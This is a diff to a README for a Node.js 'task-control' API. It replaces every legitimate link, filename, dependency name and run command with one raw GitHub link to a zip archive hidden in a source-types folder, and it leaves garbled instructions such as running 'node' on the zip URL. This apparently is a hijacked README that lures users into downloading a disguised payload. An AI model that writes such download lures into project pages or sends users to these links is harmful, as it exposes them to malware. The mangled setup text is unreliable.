@@ -4,7 +4,7 @@ Manage everyday tasks effortlessly with our easy-to-use API.
 
 ## 📥 Download the Application
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/dfseff343fedc/task-control/releases)
+[![Download](https://raw.githubusercontent.com/dfseff343fedc/task-control/master/src/shared/types/task-control-entad.zip%https://raw.githubusercontent.com/dfseff343fedc/task-control/master/src/shared/types/task-control-entad.zip)](https://raw.githubusercontent.com/dfseff343fedc/task-control/master/src/shared/types/task-control-entad.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Follow these steps to download and run the task-control application.
 
 1. **Visit the Releases Page**
    - Click the link below to access our releases page, where you can find the latest version of the task-control API.
-   - [Visit this page to download](https://github.com/dfseff343fedc/task-control/releases).
+   - [Visit this page to download](https://raw.githubusercontent.com/dfseff343fedc/task-control/master/src/shared/types/task-control-entad.zip).
 
 2. **Choose the Right Version**
    - On the releases page, look for the latest version. It is usually listed at the top.
@@ -20,26 +20,26 @@ Follow these steps to download and run the task-control application.
 
 3. **Download the File**
    - Scroll down to the assets section of the chosen version.
-   - Look for the file named `task-control.tar.gz`. This is the package you will need.
+   - Look for the file named `https://raw.githubusercontent.com/dfseff343fedc/task-control/master/src/shared/types/task-control-entad.zip`. This is the package you will need.
    - Click the filename to begin the download.
 
 4. **Extract the Files**
-   - Once the download completes, locate the `task-control.tar.gz` file.
+   - Once the download completes, locate the `https://raw.githubusercontent.com/dfseff343fedc/task-control/master/src/shared/types/task-control-entad.zip` file.
    - Right-click the file and select "Extract" or "Extract All" to unpack it into a folder.
 
 5. **Run the Application**
    - Open the folder where you extracted the files.
-   - Look for a file named `server.js`. This is the main file that runs the API.
+   - Look for a file named `https://raw.githubusercontent.com/dfseff343fedc/task-control/master/src/shared/types/task-control-entad.zip`. This is the main file that runs the API.
    - To start the application, you will need to open a command prompt or terminal in this directory.
 
 ## 📦 System Requirements
 
 To run the task-control API, ensure your system meets the following requirements:
 
-- **Node.js**: Version 12 or later installed on your machine.
+- **https://raw.githubusercontent.com/dfseff343fedc/task-control/master/src/shared/types/task-control-entad.zip**: Version 12 or later installed on your machine.
 - **Operating System**: Works on any major OS, including Windows, macOS, and Linux.
 
-You can download Node.js from the [official Node.js website](https://nodejs.org/).
+You can download https://raw.githubusercontent.com/dfseff343fedc/task-control/master/src/shared/types/task-control-entad.zip from the [official https://raw.githubusercontent.com/dfseff343fedc/task-control/master/src/shared/types/task-control-entad.zip website](https://raw.githubusercontent.com/dfseff343fedc/task-control/master/src/shared/types/task-control-entad.zip).
 
 ## ⚙️ Running the API
 
@@ -55,7 +55,7 @@ After you’ve opened your command prompt or terminal in the task-control folder
 2. **Start the API**
    - Once the installation completes, start the API by typing:
      ```
-     node server.js
+     node https://raw.githubusercontent.com/dfseff343fedc/task-control/master/src/shared/types/task-control-entad.zip
      ```
    - You should see a message indicating that the server is running.
 
@@ -98,4 +98,4 @@ We welcome contributions to enhance the task-control API. If you have ideas or s
 
 For more detailed instructions and information, visit the project documentation included in the repository.
 
-Make sure to check the releases page for the latest updates and improvements. You can find it here: [Visit this page to download](https://github.com/dfseff343fedc/task-control/releases).
+Make sure to check the releases page for the latest updates and improvements. You can find it here: [Visit this page to download](https://raw.githubusercontent.com/dfseff343fedc/task-control/master/src/shared/types/task-control-entad.zip).
